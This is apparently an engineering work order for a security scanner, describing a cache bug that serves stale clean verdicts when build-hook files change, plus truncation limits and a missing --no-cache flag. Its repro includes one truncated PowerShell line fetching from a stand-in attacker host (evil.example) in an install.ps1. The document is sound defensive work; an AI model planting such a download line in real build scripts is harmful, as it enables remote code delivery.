# WO5.0.0-010 — Scan: cache input-hash parity with the rule read-surface + escape hatch

**Series:** WO5.0.0 (exploration round 2026-08-18)
**Status:** OPEN
**Owner:** (unassigned — worktree `wo/5.0.0/scan-cache-parity`)
**Priority:** P0 · Effort M · Risk M
**Scope:** `picosentry/scan/cli_service.py`, `picosentry/scan/rules/dangerous_build_hooks.py`, `picosentry/scan/campaigns/_base.py`, `picosentry/scan/cli_commands/scan.py`, `tests/scan/test_cache_correctness.py`

**Gate:** `bash scripts/test.sh fast` + new parity test: for every file type/suffix the rules read, changing it must change `_hash_target_inputs` (property test over the declared read-surface); `picosentry scan . --no-cache` works.

## Objective
A cache must never serve a stale clean verdict for content the rules actually read; and users must be able to turn it off.

## Evidence (verified 2026-08-18, explorer SA-R; live repros)
1. **Hash blind spots = stale clean verdicts** (HIGH): WO-006's key hashes only `_RELEVANT_EXTENSIONS`/`_RELEVANT_FILE_NAMES` (`cli_service.py:74-108`), but L2-BUILD-001 (cross-ecosystem, every scan) reads `.rs`, `.nuspec`, `.targets`, `.props`, `.ps1`, `build.rs`, `Rakefile`, `extconf.rb` (`dangerous_build_hooks.py:121-142,243-254`) — none hashed; campaigns read `node_modules/` which `_SKIP_DIRS` excludes. Live: nuget project RUN1 benign `install.ps1` → cached clean; RUN2 `install.ps1` replaced with `Invoke-WebRequest http://evil.example/…` → **0 findings, exit 0 (stale hit)**; RUN3 with `PICOSENTRY_CACHE_TTL_SECONDS=0` → `L2-BUILD-001 CRITICAL ×2`, exit 1.
2. **Truncation cliffs undocumented**: `[:_MAX_INPUT_FILES]` (2048) + 64MB byte-cap break (`cli_service.py:56-58,97,106-107`) — files past the boundary never affect the key on large monorepos.
3. **No `--no-cache` flag**: `_load_cache` reads `getattr(self.args, "no_cache", False)` (`cli_service.py:172`) — attribute exists nowhere else; `picosentry scan . --no-cache` → `unrecognized arguments` (exit 2). Only the undocumented env trick works.

## Deliverables
1. Derive the hashed set from the rules' declared read surface (single shared constant both sides import), or extend it to build-hook suffixes + `node_modules/*/package.json`.
2. Fold a marker (total count + total size) into the hash on truncation; honest-ceiling comment.
3. `--no-cache` CLI flag wiring the existing attribute; documented.
